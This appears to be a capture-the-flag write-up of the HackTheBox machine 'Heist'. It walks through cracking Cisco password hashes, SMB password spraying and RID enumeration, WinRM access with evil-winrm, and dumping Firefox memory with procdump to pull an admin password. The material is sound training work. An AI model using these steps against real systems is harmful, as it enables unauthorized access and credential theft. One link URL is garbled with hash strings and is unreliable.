---
title: "HackTheBox - Windows - Easy - Heist"
date: 2025-11-08 12:00:00 -0000
categories: [CTF, HackTheBox]
tags: [windows, web discovery, smb, winRM, memory dump, procdump]
---

![Heist](/assets/img/ctf/htb/easy/heist/heist.png)

# Initial Intel
* Difficulty: Easy
* OS: Windows

# tl;dr
<details><summary>Spoilers</summary>
* Enumerate the webserver for an issues page and an attachment file.<br/>
* Get the username and hashes from the file. The hashes can be decrypted<br/>
* Bruteforce SMB with the acquired username and the decrypted password list<br/>
* Perform authenticated SMB enum once the username:password cred has been discovered. Enum more usernames<br/>
* Conduct another SMB bruteforce with the new usernames and current password list. Then connect to the $target via winRM with the new creds<br/>
* Look for a process the user may be running that can be dumped. Think about what tasks the user does and how they would do it<br/>
* Search the .dmp file for creds. Consider the webserver app and how it receives credentials for what you want to search the .dmp file for<br/>
</details>

# Attack Path

## Recon

### Service Enumeration

Standard TCP scan to start:

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
└─$ nmap_tcp_full $heist  
...
PORT      STATE SERVICE       REASON          VERSION  
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0 
    | http-title: Support Login Page 
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
445/tcp   open  microsoft-ds? syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC 
```

Notable services:

#### 80/tcp - HTTB

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]  
└─$ whatweb $heist
...
http://10.10.10.149 [302 Found] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.149], Microsoft-IIS[10.0], PHP[7.3.1], RedirectLocation[login.php], X-Powered-By[PHP/7.3.1]      http://10.10.10.149/login.php [200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.149], JQuery[3.1.1], Microsoft-IIS[10.0], PHP[7.3.1], PasswordField[login_password], Script, Title[Support Login Page], X-Powered-By[PHP/7.3.1]
```

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist] 
└─$ feroxbuster --url http://$heist --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do
```

http://10.10.10.149/login.php

![Webserver Login Page](/assets/img/ctf/htb/easy/heist/1.png)

Login Page, can login as 'guest'.

http://10.10.10.149/issues.php

![Guest login - Issues](/assets/img/ctf/htb/easy/heist/2.png)

Logged in as *guest*, issues with attachments upload feature.

http://10.10.10.149/attachments/config.txt

![Attachments - config.txt](/assets/img/ctf/htb/easy/heist/3.png)

*hazard* username. Also, context for *config.txt*:

```text
Hi, I've been experiencing problems with my cisco router. Here's a part of the configuration the previous admin had been using. I'm new to this and don't know how to fix it. :(
```
![config.txt - users and passwords](/assets/img/ctf/htb/easy/heist/4.png)

Some additional usernames and potential passwords were also in the file.

```text
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
```

Given the context of the file, we can deduce these are Cisco password hashes. Specifically, Type 5 amd Type 7 passwords.

I tried to decrypt using an online crack for the Type 5, but had to switch to *john*

Type 5 Password Decrypt:
[Type 5 Password Decrypt](https://www.ifm.net.nz/cookbooks/cisco-ios-enable-secret-password-cracker.html)

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
└─$ vim hashes.ciscoASAMD5
$1$pdQG$o8nrSzsGXeaduXrjlvKc91

┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.ciscoASAMD5 
...
$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
```

Cracked the password.

Next were the Type 7 passwords:

Type 7 Password Decrypt
[Type 7 Password Decrypt](https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html)

```text
0242114B0E143F015F5D1E161713:$uperP@ssword
02375012182C1A1D751618034F36415408:Q4)sJu\Y8qz*A3?d
```

Got them both. I threw all three passwords and the usernames from earlier into respective files, users.txt and passwords.txt.

```text
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
└─$ cat users.txt
hazard
rout3r
admin
```

```text
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
└─$ cat passwords.txt 
stealth1agent
Q4)sJu\Y8qz*A3?d
$uperP@ssword 
```

I wasn't able to bruteforce the login page, so I moved onto SMB recon next.

#### 445/tcp - SMB

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist] 
└─$ enum4linux-ng -A $heist
...
SMB Dialect Check on 10.10.10.149   
    SMB 1.0: false  
    SMB 2.02: true
    SMB 2.1: true 
    SMB 3.0: true
    SMB 3.1.1: true

Domain Information via SMB session for 10.10.10.149
    NetBIOS computer name: SUPPORTDESK
    DNS domain: SupportDesk
    FQDN: SupportDesk
    Derived membership: workgroup member 
```

I did a bruteforce with the users and passwords acquired against SMB:

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
└─$ nxc smb $heist -u users.txt -p passwords.txt --continue-on-success
...
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent   
```

Got a user:password pair:

```text
hazard:stealth1agent
```

I enumerated shares available to *hazard* and only IPC$ was readable. Nothing of note was found.

Then I tried to enumerate additional users:

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
└─$ nxc smb $heist -u hazard -p stealth1agent --rid-brute | cut -d '\' -f 2 | cut -d " " -f 1 > users_rid.txt

┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
└─$ cat users_rid.txt
Administrator 
Guest
WDAGUtilityAccount
None
Hazard
support
Chase
Jason
```

Several other users were enumerated, including a few built-in accounts. I added these to users.txt. Then I tried another bruteforce against SMB with the new usernames:

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
└─$ nxc smb $heist -u users_rid.txt -p passwords.txt --continue-on-success
...
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Chase:Q4)sJu\Y8qz*A3?d 
```

Got another cred pair with user *chase*. Like user *hazard*, this new user did not have any special permissions to the SMB shares. Further SMB enum did not reveal anything valuable.

## Foothold

User *hazard* could not remote via winRM. However, *chase* COULD use winRM:

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
└─$ evil-winrm -i $heist -u chase -p 'Q4)sJu\Y8qz*A3?d'
```

![Access via evil-winRIM](/assets/img/ctf/htb/easy/heist/5.png)

After getting the user.txt flag, I looked at the *todo.txt* file. This didn't seem like much at first. However, after running winPEAS and performing other privEsc checks and finding no way forward, I came back to this file and thought about it closely...

User *chase* would be using this system to continuously check on issues submitted through the webserver. Likely this would be done using a browser. 

When I had tried to bruteforce the login page on the webapp earlier, the username and password values were submitted via POST requests. That may mean that this user's admin creds could be stored in memory for the browser process.

Firefox seems to be installed so I checked for running processes for it.

```powershell
*Evil-WinRM* PS C:\Users\Chase\Desktop> get-process -name firefox 

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
355      25    16512      39084       0.14    340   1 firefox
```

Next I used procdump to dump the memory related to the process:
[Procdump](https://docs.microsoft.com0242114B0E143F015F5D1E16171302375012182C1A1D751618034F36415408/en-us/sysinternals/downloads/procdump)

```powershell
*Evil-WinRM* PS C:\Users\Chase\Desktop> .\pd.exe -ma 340 firefox.dmp 
```

After I transfered the .dmp file to $attacker I searched for the POST variable from the login page:

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
└─$ strings -el attacker/firefox.dmp | grep login_password
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```

...and got the cred *admin:4dD!5}x/re8]FBuZ*


## Lateral Movement / Privilege Escalation

N/A - going straight to admin

## Root / SYSTEM

It was pretty easy to guess that *admin* would probably share a password with the built-in *administrator* account. I checked with SMB:

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
└─$ nxc smb $heist -u administrator -p '4dD!5}x/re8]FBuZ'
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\administrator:4dD!5}x/re8]FBuZ (Pwn3d!)
```

With that confirmed, I remoted in as administrator to get the root.txt flag and pwn Heist:

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist] 
└─$ evil-winrm -i $heist -u administrator -p '4dD!5}x/re8]FBuZ'

*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
7b89*************************************
```

# Lessons Learned
* Pay attention to the context of a hash, it may give a clue to the type (e.g. Cisco hashes from a Cisco device)
* A user that cannot read the SMB ADMIN$ share may still be able to remote via WinRM. Check with each new user credential obtained.
* When on the $target, look for indicators that a user or process is running that can be dumped. Get the process ID and then use procdump to get the .dmp file
* Move the file to attacker and then search the .dmp for a string like 'password' or other variable enumerated earlier
